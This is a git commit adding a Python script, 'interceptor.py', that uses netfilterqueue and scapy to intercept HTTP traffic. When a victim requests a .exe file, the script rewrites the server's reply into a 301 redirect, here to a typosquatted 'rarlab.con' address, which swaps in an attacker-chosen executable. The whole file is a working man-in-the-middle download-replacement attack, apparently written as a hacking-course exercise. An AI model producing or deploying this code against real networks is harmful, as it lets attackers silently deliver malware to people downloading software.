1a283bb31313a63ad61bd55c5b8ae5a804e07bde
l0neaadil <loneaadil008@outlook.com>
2020-08-28 11:18:50 +0530

    interceptor

---
+++ 06_File_interceptor/interceptor.py
@@ -0,0 +1,32 @@
+#!/usr/bin/env python
+import netfilterqueue
+import scapy.all as scapy
+
+ack_list=[]
+
+
+def process_packet(packet):
+    scapy_packet=scapy.IP(packet.get_payload)
+    if scapy_packet.haslayer(scapy.Raw):
+        if scapy_packet[scapy.TCP].dport==80:
+            if '.exe' in scapy_packet[scapy.Raw].load:
+                print('--> exe request')
+                ack_list.append(scapy_packet[scapy.TCP].ack)
+
+        elif scapy_packet[scapy.TCP].sport==80:
+            if scapy_packet[scapy.TCP].seq in ack_list:
+                ack_list.remove(scapy_packet[scapy.TCP].seq )
+                print('--> Replacing File')
+                scapy_packet[scapy.Raw].load = 'HTTP/1.1 301 Moved Permanently \n Location: https://www.rarlab.con/rar/wrar56b1.exe \n\n'
+                del scapy_packet[scapy.IP].len
+                del scapy_packet[scapy.IP].chksum
+                del scapy_packet[scapy.TCP].chksum
+                packet.set_payload(str(scapy_packet))
+    packet.accept()
+
+
+queue=netfilterqueue.NetfilterQueue()
+queue.bind(0,process_packet)
+queue.run()
+
+
